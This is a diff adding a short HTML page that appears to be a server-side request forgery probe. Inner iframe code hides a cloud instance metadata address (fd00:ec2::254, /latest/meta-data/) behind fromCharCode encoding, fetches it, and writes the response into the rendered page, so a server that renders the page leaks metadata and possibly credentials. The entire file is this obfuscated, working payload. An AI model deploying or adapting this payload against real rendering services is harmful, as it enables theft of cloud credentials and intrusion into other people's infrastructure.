@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html><body>
+<h1>DATA_IFRAME_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+var innerCode = '<script>try{var x=new XMLHttpRequest();var ip=String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);var p=String.fromCharCode(104,116,116,112);x.open("GET",p+"://["+ip+"]/latest/meta-data/",false);x.send();parent.postMessage("IFRAME_STATUS:"+x.status+" BODY:"+x.responseText.substr(0,1000),"*");}catch(e){parent.postMessage("IFRAME_ERROR:"+e.name+":"+e.message,"*");}<\/script>';
+var html = '<html><body>' + innerCode + '</body></html>';
+
+window.addEventListener('message', function(e) {
+  document.getElementById('r1').innerText = 'RECEIVED:' + e.data;
+});
+
+var iframe = document.createElement('iframe');
+iframe.srcdoc = html;
+document.body.appendChild(iframe);
+</script>
+</body></html>
